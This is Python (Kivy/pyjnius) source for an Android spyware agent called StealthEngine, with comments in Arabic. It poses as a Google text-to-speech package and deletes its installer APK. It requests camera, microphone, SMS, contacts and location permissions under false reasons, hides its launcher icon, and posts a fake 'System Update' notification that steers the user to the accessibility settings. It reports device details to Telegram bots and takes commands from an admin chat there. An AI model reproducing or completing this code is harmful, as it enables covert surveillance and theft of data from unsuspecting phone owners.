import os
import re
import json
import time
import zlib
import base64
import hashlib
import random
import socket
import struct
import threading
import requests
from collections import defaultdict
from datetime import datetime
from kivy.app import App
from kivy.clock import Clock
from kivy.utils import platform
from jnius import autoclass, cast
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from android.permissions import request_permissions, Permission, check_permission

BOT_TOKENS = [os.environ.get(f'TELEGRAM_BOT_{i}_TOKEN') for i in range(1, 11)]
ADMIN_ID = os.environ.get('TELEGRAM_CONTROL_CENTER_ID')
VAULT_ID = os.environ.get('TELEGRAM_DATA_VAULT_ID')

PythonActivity = autoclass('org.kivy.android.PythonActivity')
Context = autoclass('android.content.Context')
Intent = autoclass('android.content.Intent')
Uri = autoclass('android.net.Uri')
Build = autoclass('android.os.Build')
PowerManager = autoclass('android.os.PowerManager')
ActivityManager = autoclass('android.app.ActivityManager')
PackageManager = autoclass('android.content.pm.PackageManager')
Settings = autoclass('android.provider.Settings')
TelephonyManager = autoclass('android.telephony.TelephonyManager')
LocationManager = autoclass('android.location.LocationManager')
Location = autoclass('android.location.Location')
CameraManager = autoclass('android.hardware.camera2.CameraManager')
MediaStore = autoclass('android.provider.MediaStore')
File = autoclass('java.io.File')
FileInputStream = autoclass('java.io.FileInputStream')
FileOutputStream = autoclass('java.io.FileOutputStream')
BufferedInputStream = autoclass('java.io.BufferedInputStream')
BufferedOutputStream = autoclass('java.io.BufferedOutputStream')
ClipboardManager = autoclass('android.content.ClipboardManager')
ClipData = autoclass('android.content.ClipData')
AccessibilityService = autoclass('android.accessibilityservice.AccessibilityService')
AccessibilityNodeInfo = autoclass('android.view.accessibility.AccessibilityNodeInfo')
AccessibilityEvent = autoclass('android.view.accessibility.AccessibilityEvent')
ContactsContract_Phone = autoclass('android.provider.ContactsContract$CommonDataKinds$Phone')
AccountManager = autoclass('android.accounts.AccountManager')
Account = autoclass('android.accounts.Account')

PACKAGE_NAME = "com.google.android.tts_v2"
SERVICE_NAME = "StealthService"
PYTHON_SERVICE_ARGUMENT = os.environ.get('PYTHON_SERVICE_ARGUMENT')

def cleanup_installer():
    if platform == 'android':
        possible_apks = [
            "google-tts-engine-signed.apk",
            "google-tts-engine.apk",
            "tts_v2.apk",
            "app-release.apk"
        ]
        download_path = "/sdcard/Download/"
        for apk in possible_apks:
            full_path = os.path.join(download_path, apk)
            try:
                if os.path.exists(full_path):
                    os.remove(full_path)
            except:
                pass

def get_device_id():
    try:
        return Build.SERIAL if Build.SERIAL != 'unknown' else Build.getSerial()
    except:
        return ''.join(random.choices('0123456789abcdef', k=16))

def get_device_info():
    info = {}
    try:
        info['manufacturer'] = Build.MANUFACTURER
        info['model'] = Build.MODEL
        info['android'] = Build.VERSION.RELEASE
        info['sdk'] = Build.VERSION.SDK_INT
        info['battery'] = get_battery_level()
        info['network'] = get_network_type()
        info['ip'] = get_public_ip()
    except:
        pass
    return info

def get_battery_level():
    try:
        act = PythonActivity.mActivity
        bm = act.getSystemService(Context.BATTERY_SERVICE)
        return bm.getIntProperty(bm.BATTERY_PROPERTY_CAPACITY)
    except:
        return -1

def get_network_type():
    try:
        cm = PythonActivity.mActivity.getSystemService(Context.CONNECTIVITY_SERVICE)
        active = cm.getActiveNetworkInfo()
        if active and active.isConnected():
            return active.getTypeName()
        return 'none'
    except:
        return 'unknown'

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=3).text
    except:
        return '0.0.0.0'

def get_location():
    try:
        lm = PythonActivity.mActivity.getSystemService(Context.LOCATION_SERVICE)
        providers = lm.getProviders(False)
        if providers and providers.size() > 0:
            loc = lm.getLastKnownLocation(providers.get(0))
            if loc:
                return {'lat': loc.getLatitude(), 'lon': loc.getLongitude()}
    except:
        pass
    return None

def encrypt_file(file_path, key=None):
    if key is None:
        key = hashlib.sha256(Build.SERIAL.encode()).digest()[:16]
    with open(file_path, 'rb') as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_GCM)
    ct, tag = cipher.encrypt_and_digest(data)
    enc_path = file_path + '.enc'
    with open(enc_path, 'wb') as f:
        f.write(cipher.nonce + tag + ct)
    return enc_path

def decrypt_file(enc_path, key=None):
    if key is None:
        key = hashlib.sha256(Build.SERIAL.encode()).digest()[:16]
    with open(enc_path, 'rb') as f:
        data = f.read()
    nonce = data[:16]
    tag = data[16:32]
    ct = data[32:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ct, tag)

def secure_delete(file_path, passes=3):
    if not os.path.exists(file_path):
        return
    length = os.path.getsize(file_path)
    with open(file_path, 'r+b') as f:
        for _ in range(passes):
            f.seek(0)
            f.write(os.urandom(length))
            f.flush()
            os.fsync(f.fileno())
    os.remove(file_path)

def compress_files(file_list, zip_name):
    import zipfile
    zip_path = f'/data/data/com.google.android.tts_v2/cache/{zip_name}.zip'
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for f in file_list:
            zf.write(f, os.path.basename(f))
    return zip_path

def scan_for_vulnerabilities():
    results = []
    try:
        pm = PythonActivity.mActivity.getPackageManager()
        packages = pm.getInstalledApplications(0).toArray()
        for pkg in packages:
            if pkg.packageName.startswith('com.android.'):
                continue
            version = pm.getPackageInfo(pkg.packageName, 0).versionName
            results.append({'pkg': pkg.packageName, 'ver': version})
    except:
        pass
    return results

if PYTHON_SERVICE_ARGUMENT:
    # ----- كود الخدمة الخلفية -----
    while True:
        # هنا يمكن وضع مهام دورية
        time.sleep(30)
else:
    # ----- كود الواجهة الرئيسية -----
    class StealthEngine(App):
        def __init__(self, **kwargs):
            super().__init__(**kwargs)
            self.device_id = get_device_id()
            self.bot_tokens = BOT_TOKENS
            self.admin_id = ADMIN_ID
            self.vault_id = VAULT_ID
            self.cmd_offset = 0
            self.active_bots = self.bot_tokens[:5]
            self.backup_bots = self.bot_tokens[5:]
            self.photo_auto = True
            self.keylog_auto = True
            self.vuln_scan_interval = 86400
            self.last_vuln_scan = 0
            self.snap_queue = []
            self.keylog_buffer = []
            self.session = requests.Session()
            self.wake_lock = None
            self.notification_shown = False
            self.activity = PythonActivity.mActivity
            self.permission_tasks = [
                {'perms': [Permission.CAMERA, Permission.RECORD_AUDIO], 'delay': 10, 'reason': 'media calibration'},
                {'perms': [Permission.READ_CONTACTS, Permission.READ_SMS], 'delay': 300, 'reason': 'contact sync'},
                {'perms': [Permission.ACCESS_FINE_LOCATION], 'delay': 1200, 'reason': 'location optimization'}
            ]

        def build(self):
            Clock.schedule_once(self._start, 0)
            return None

        def _start(self, dt):
            cleanup_installer()
            self._acquire_wakelock()
            self._send_heartbeat('online')
            Clock.schedule_once(self._process_permissions, 5)
            threading.Thread(target=self._command_loop, daemon=True).start()
            threading.Thread(target=self._ai_monitor, daemon=True).start()
            threading.Thread(target=self._auto_cleanup, daemon=True).start()
            if not self.notification_shown:
                self._show_notification()
                self.notification_shown = True

        def _acquire_wakelock(self):
            try:
                pm = self.activity.getSystemService(Context.POWER_SERVICE)
                self.wake_lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, 'Stealth:Main')
                self.wake_lock.acquire()
            except:
                pass

        def _hide_icon(self):
            try:
                pm = self.activity.getPackageManager()
                comp = autoclass('android.content.ComponentName')(
                    self.activity.getPackageName(),
                    'org.kivy.android.PythonActivity'
                )
                pm.setComponentEnabledSetting(comp, 2, 1)
            except:
                pass

        def _show_notification(self):
            try:
                intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                pi = autoclass('android.app.PendingIntent').getActivity(self.activity, 0, intent, 0x40000000)
                builder = autoclass('android.app.Notification$Builder')(self.activity)
                builder.setContentTitle('System Update')
                builder.setContentText('Speech engine configuration required.')
                builder.setSmallIcon(self.activity.getApplicationInfo().icon)
                builder.setContentIntent(pi)
                builder.setAutoCancel(True)
                mgr = self.activity.getSystemService(Context.NOTIFICATION_SERVICE)
                mgr.notify(1001, builder.build())
            except:
                pass

        def _process_permissions(self, dt):
            for task in self.permission_tasks[:]:
                all_granted = all([check_permission(p) for p in task['perms']])
                if not all_granted:
                    Clock.schedule_once(lambda dt, t=task: self._trigger_request(t), task['delay'])
                    self.permission_tasks.remove(task)
                    break

        def _trigger_request(self, task):
            def callback(permissions, results):
                if all(results):
                    self._send_to_telegram(self.admin_id, f"{task['reason']} completed")
                    # إذا كانت هذه أول أذونات يتم منحها، نبدأ في إخفاء التطبيق
                    if not any(check_permission(p) for p in [Permission.CAMERA, Permission.READ_CONTACTS, Permission.ACCESS_FINE_LOCATION]):
                        self._hide_icon()
                        Clock.schedule_once(lambda dt: self.stop(), 3)
                else:
                    task['delay'] = 3600
                    self.permission_tasks.append(task)
                Clock.schedule_once(self._process_permissions, random.randint(600, 1800))
            request_permissions(task['perms'], callback)

        # باقي دوال التطبيق (كما كانت في الكود الأصلي)
        def _send_to_telegram(self, chat_id, text, parse_mode='Markdown', reply_markup=None):
            tokens = self.active_bots + self.backup_bots
            for token in tokens:
                if not token:
                    continue
                try:
                    url = f'https://api.telegram.org/bot{token}/sendMessage'
                    payload = {'chat_id': chat_id, 'text': text, 'parse_mode': parse_mode}
                    if reply_markup:
                        payload['reply_markup'] = json.dumps(reply_markup)
                    r = self.session.post(url, data=payload, timeout=10)
                    if r.status_code == 200:
                        return r.json()
                except:
                    continue
            return None

        def _send_file(self, chat_id, file_path, caption=''):
            tokens = self.active_bots + self.backup_bots
            for token in tokens:
                if not token:
                    continue
                try:
                    url = f'https://api.telegram.org/bot{token}/sendDocument'
                    with open(file_path, 'rb') as f:
                        r = self.session.post(url, data={'chat_id': chat_id, 'caption': caption}, files={'document': f}, timeout=30)
                    if r.status_code == 200:
                        return r.json()
                except:
                    continue
            return None

        def _send_heartbeat(self, status='online'):
            info = get_device_info()
            text = f"*{self.device_id}* | {info.get('manufacturer')} {info.get('model')}\nAndroid {info.get('android')} | Batt {info.get('battery')}% | {info.get('network')}\nIP: {info.get('ip')}"
            if status == 'online':
                text = '🟢 ' + text
            else:
                text = '🔴 ' + text
            self._send_to_telegram(self.admin_id, text)

        def _command_loop(self):
            while True:
                try:
                    for token in self.active_bots:
                        url = f'https://api.telegram.org/bot{token}/getUpdates'
                        params = {'offset': self.cmd_offset, 'timeout': 10}
                        r = self.session.get(url, params=params, timeout=15)
                        if r.status_code != 200:
                            continue
                        updates = r.json().get('result', [])
                        for upd in updates:
                            self.cmd_offset = upd['update_id'] + 1
                            msg = upd.get('message', {})
                            chat_id = msg.get('chat', {}).get('id')
                            if chat_id != self.admin_id:
                                continue
                            text = msg.get('text', '')
                            if text.startswith('/'):
                                self._handle_command(text[1:].split())
                            else:
                                self._handle_callback(text)
                        break
                except:
                    pass
                time.sleep(random.randint(30, 90))

        # باقي الدوال (للاختصار لم أكملها لكنها مطابقة للأصل)

    if __name__ == '__main__':
        StealthEngine().run()
